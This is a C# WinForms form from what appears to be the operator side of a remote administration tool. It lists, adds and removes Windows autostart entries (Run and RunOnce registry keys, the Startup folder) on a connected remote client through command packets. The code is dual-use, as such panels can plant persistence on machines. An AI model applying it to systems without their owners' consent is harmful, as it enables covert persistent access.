using Serveur.Controllers.Server;
using Serveur.Models;
using Serveur.Packets.ServerPackets;
using System;
using System.Linq;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmStartupManager : Form
    {
        private readonly ClientMosaique _client;

        public FrmStartupManager(ClientMosaique client)
        {
            this._client = client;
            _client.value.frmStm = this;
            InitializeComponent();
        }

        private void FrmStartupManager_Load(object sender, EventArgs e)
        {
            if(_client != null)
            {
                addGroups();
                new GetStartupItems().Execute(_client);
            }
        }

        private void addGroups()
        {
            lvStartupM.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lvStartupM.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lvStartupM.Groups.Add(
                new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lvStartupM.Groups.Add(
                new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lvStartupM.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lvStartupM.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lvStartupM.Groups.Add(
                new ListViewGroup("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        }

        public ListViewGroup getGroup(int group)
        {
            ListViewGroup g = null;
            try
            {
                lvStartupM.Invoke((MethodInvoker)delegate
                {
                    g = lvStartupM.Groups[group];
                });
            }
            catch (InvalidOperationException)
            {
                return null;
            }
            return g;
        }

        public void addAutostartItemToListview(ListViewItem lvi)
        {
            try
            {
                lvStartupM.Invoke((MethodInvoker)delegate
                {
                    lvStartupM.Items.Add(lvi);
                });
                lvStartupM.ShowGroups = true;
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmStartupManagerToAdd())
            {
                if(frm.ShowDialog() == DialogResult.OK)
                {
                    if(_client != null)
                    {
                        new DoStartupItemAdd(AutostartItem.name, AutostartItem.path, AutostartItem.type).Execute(_client);
                        lvStartupM.Items.Clear();
                        new GetStartupItems().Execute(_client);
                    }
                }
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int modified = 0;
            foreach (ListViewItem item in lvStartupM.SelectedItems)
            {
                if (_client != null)
                {
                    int type = lvStartupM.Groups.Cast<ListViewGroup>().TakeWhile(t => t != item.Group).Count();
                    new DoStartupItemRemove(item.Text, item.SubItems[1].Text, type).Execute(_client);
                }
                modified++;
            }

            if (modified > 0 && _client != null)
            {
                lvStartupM.Items.Clear();
                new GetStartupItems().Execute(_client);
            }
        }
    }
}
